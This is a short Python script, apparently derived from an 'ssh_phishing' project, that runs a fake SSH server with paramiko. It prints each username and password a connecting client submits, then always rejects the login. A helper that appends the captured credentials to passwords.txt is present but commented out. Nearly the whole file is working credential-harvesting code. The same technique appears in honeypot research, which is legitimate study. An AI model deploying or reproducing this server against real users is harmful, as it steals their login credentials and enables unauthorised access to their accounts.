#!/usr/bin/env python3

# inspired by https://github.com/brerodrigues/ssh_phishing

import logging
import socket
import sys
import threading
import paramiko


class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def save_password_to_file(self, username, password):
        password_file = open("passwords.txt", "a")
        password_file.write("Username: " + username + "\n")
        password_file.write("Password: " + password + "\n")
        password_file.close()

    def check_auth_password(self, username, password):
        print("Username:", username)
        print("Password:", password)
        print("-" * 30)
        # self.save_password_to_file(username, password)
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return "password"


def listener():
    host_key = paramiko.RSAKey(filename=sys.argv[1])
    port_number = int(sys.argv[2])

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("", port_number))

    sock.listen(100)
    print("Waiting for connections on port", port_number)
    client, addr = sock.accept()
    print("Connection from:", client.getpeername()[0])
    print("Waiting for authentication...")

    transport = paramiko.Transport(client)
    transport.set_gss_host(socket.getfqdn(""))
    transport.load_server_moduli()
    transport.add_server_key(host_key)

    server = Server()
    transport.start_server(server=server)

    server.event.wait(5)


def main():
    if len(sys.argv) != 3:
        print("Usage: python3", sys.argv[0], "[rsa_server_key_file] [port]")
        sys.exit(1)

    logging.basicConfig()
    logger = logging.getLogger()

    while True:
        try:
            listener()
        except KeyboardInterrupt:
            sys.exit(0)
        except Exception as exc:
            logger.error(exc)


if __name__ == "__main__":
    main()
